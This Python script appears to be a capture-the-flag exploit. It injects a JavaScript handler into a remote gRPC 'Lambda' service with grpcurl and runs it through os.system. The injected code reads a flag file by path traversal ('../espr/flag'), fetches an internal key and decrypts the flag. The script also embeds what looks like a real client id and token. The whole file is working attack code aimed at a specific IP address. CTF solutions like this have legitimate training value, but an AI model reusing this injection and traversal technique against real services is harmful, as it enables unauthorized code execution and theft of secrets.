# coding: utf-8
import os

code = r'''
var flag = GetStorage(\"../espr/flag\");
var key = _getmapex(\"espr/data/key\");
console.log(\"getmapex(key)\", key);
console.log(\"flag encrypted\", flag);
console.log(\"flag decrypted\", sjcl.decrypt(key, flag));
return {status: 200, response: \"\", code:this._getmapex}
'''

cmd = '''
grpcurl -insecure -d '{
    "creds":{
        "cid": "56df926161f7", "token": "dad72cb568a124f74988b9b22db062c18871adf0f8c516650ca238e96eff14c0"
    },"handler":{
        "endpoint": "diofeher",
        "code":"function handle(args) {%s}"
        }
    }' 35.207.157.20:443 c3.Lambda/RegisterHandler
''' % code.strip().replace('\n', '')
print cmd
os.system(cmd)
